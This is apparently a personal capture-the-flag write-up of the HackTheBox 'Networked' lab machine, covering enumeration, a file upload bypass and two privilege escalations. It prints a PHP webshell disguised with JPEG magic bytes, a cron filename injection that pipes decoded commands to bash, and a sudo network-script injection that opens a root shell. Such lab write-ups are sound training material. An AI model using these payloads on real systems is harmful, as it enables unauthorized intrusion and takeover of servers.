---
title: "Networked"
date: 19-08-26
---
Networked - HackTheBox

OS: Linux
Difficulty: Easy
Pawn Date: 19/08/26

---

Recognition
 nmap
```nmap -sVC -p- IP```

Ports found: 22,80

Enumeration
We find ssh and apache on his normal ports. After going into the webpage
we see a message saying that they are building the web FaceMash etc, nothing
too important here. So i used gobuster to find files and folders, after a while
we find this:
````
/index.php 200

/upload.php 200 

/uploads 301

/photos.php 200 

/lib.php 200

/backup 301 
````
with /upload.php we can upload files on the server, the /backup contains a tar
archive that i downloaded and that thing cointains the source code of the PHP 
files.

After checking everything so well, we now a few things
When you upload a file they check different things:
the size, you dont need to pass the limit
the file, if its not an image they reject the file
the extension, if its not gif,jpg or png ur file got deleted
they change the name of the file when u upload the file
Its vulnerable to double file extension

So knowing all those things lets upload a file!!
we are gonna upload this command to put a webshell on the server:
```bash
<?php system($_GET['cmd']); ?>
```
buuuut if we upload this file like this its gonna say its invalid sooo we are gonna
use the magic bytes first, or in my case put this command on the metadata of a jpg 
file.

Initial Access 
Vulnerability: Unrestricted File Upload
Vector:
 Initial access: webshell as apache
 Escalation 1: apache -> guly via cron injection
 Escalation 2: guly -> root via network script
Payload: we create the file with the magic bytes ```` (echo '\xFF\xD8\xFF\xE0' > shell.php.jpg) ````
and then we put the command for the webshell ```` (echo "<?php system($_GET['cmd']); ?>" >> shell.php.jpg) ````

When we where there we see a cron, that basically is not well designed-sanitized and it will execute
all the file names as commands after the ";" with "guly" user permissions soooooo we are gonna make a
file with the name that we want to execute with "guly" permissions.
````curl --data-urlencode 'cmd=touch -- ";echo thecommandthatuwantencoded | base 64 -d | bash' http://10.129.45.196/uploads/10_10_17_100.php.jpg | strings | head ````

Now we have the guly permissions 

Escalation of privileges
From:guly
to: root
Vector: sudo -l 
Method: After seeing sudo -l i saw a script that we can run as root, the script creates a configuration
for the guly0 Network Interface and uses "ifup guly0" to activate it at the end. Network configuration
scripts on CentOS are vulnerable to command injection (i knew it because i did i quick research) leading
to execution of anything after a space. So at the end to get the root acces i just executed this command:
````sudo /usr/local/sbin/changename.sh ````
````
interface NAME:
aaa /bin/bash                       #with the space between
interface PROXY_METHOD:
aaa
interface BROWSER_ONLY:
aaa
interface BOOTPROTO:
aaa
````
And now we are root, u can check it with "whoami"

Lessons Learned
- Double extension bypass: servers may check extension but not MIME type properly
- Cron jobs executing filenames without sanitization = command injection vector
- Always check sudo -l first when escalating privileges  
- Network config scripts on CentOS/RHEL are vulnerable to injection via spaces
- GTFOBins is essential when you find a binary in sudo -l
